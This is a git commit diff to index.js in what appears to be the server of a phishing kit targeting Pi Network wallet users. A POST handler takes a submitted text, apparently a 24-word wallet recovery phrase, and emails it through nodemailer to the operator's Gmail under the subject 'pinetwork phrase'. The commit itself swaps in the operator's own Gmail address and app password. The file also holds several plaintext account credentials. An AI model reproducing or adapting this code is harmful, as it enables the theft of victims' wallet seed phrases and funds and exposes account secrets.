2d94af8516393b66799935444d43940e22c3a719
vradri <vradi3735@gmail.com>
2024-10-25 11:47:07 +0100

    Update index.js

--- index.js
+++ index.js
@@ -22,8 +22,8 @@ const transporter = nodemailer.createTransport({
     // pass: "phop baoj wpki iilk",
     // user: "Pinetworkm493@gmail.com",
     //pi-personal  
-      pass: "hnul ydgk rcap defd",
-      user: "a@gmail.com",
+      pass: "jnje edwo xrah mnoe",
+      user: "vradi3735@gmail.com",
 
   },
   service: "gmail",
@@ -58,7 +58,7 @@ app.post("/submit/7668", async (req, res) => {
     // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet",
-        to: ["a@gmail.com"],
+        to: ["vradi3735@gmail.com"],
         // to: ["pablomizeto@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
